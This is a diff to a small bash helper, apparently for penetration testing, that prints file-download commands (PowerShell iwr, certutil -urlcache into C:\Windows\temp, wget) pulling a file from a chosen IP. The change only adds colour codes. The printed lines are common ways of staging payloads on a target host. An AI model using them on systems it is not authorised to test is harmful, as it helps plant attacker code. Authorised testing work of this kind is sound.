@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# Define color codes
+PINK='\033[35m'
+RESET='\033[0m'
+
 # Default values
 default_port=80
 default_file="file"
@@ -11,9 +15,9 @@ print_commands() {
     local file=$2
     local ip=$3
 
-    echo "1. iwr -uri http://$ip:$port/$file -o $file"
-    echo "2. certutil.exe -urlcache -split -f http://$ip/$file C:\\Windows\\temp\\$file"
-    echo "3. wget http://$ip:$port/$file"
+    echo "1. ${PINK}iwr -uri http://$ip:$port/$file -o $file ${RESET}"
+    echo "2. ${PINK}certutil.exe -urlcache -split -f http://$ip/$file C:\\Windows\\temp\\$file ${RESET}"
+    echo "3. ${PINK}wget http://$ip:$port/$file ${RESET}"
 }
 
 # Parse command line arguments
